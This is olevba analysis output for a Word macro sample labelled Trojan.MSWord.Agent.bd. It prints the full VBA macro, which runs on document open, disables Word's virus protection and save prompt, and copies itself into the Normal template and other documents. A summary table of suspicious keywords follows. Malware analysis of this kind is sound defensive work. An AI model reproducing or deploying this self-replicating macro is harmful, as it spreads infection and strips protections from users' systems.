olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan.MSWord.Agent.bd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan.MSWord.Agent.bd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'APMP
'KILL
Private Sub Document_Open()
   On Error Resume Next
   Application.DisplayStatusBar = False
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   MyCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 20)
   Set Host = NormalTemplate.VBProject.VBComponents(1).CodeModule
   If ThisDocument = NormalTemplate Then _
      Set Host = ActiveDocument.VBProject.VBComponents(1).CodeModule
   With Host
       If .Lines(1, 1) = "APMP" & .Lines(1, 2) <> "KILL" Then
          .DeleteLines 1, .CountOfLines
          .InsertLines 1, MyCode
          If ThisDocument = NormalTemplate Then _
             ActiveDocument.SaveAs ActiveDocument.FullName
       End If
   End With
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|KILL                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

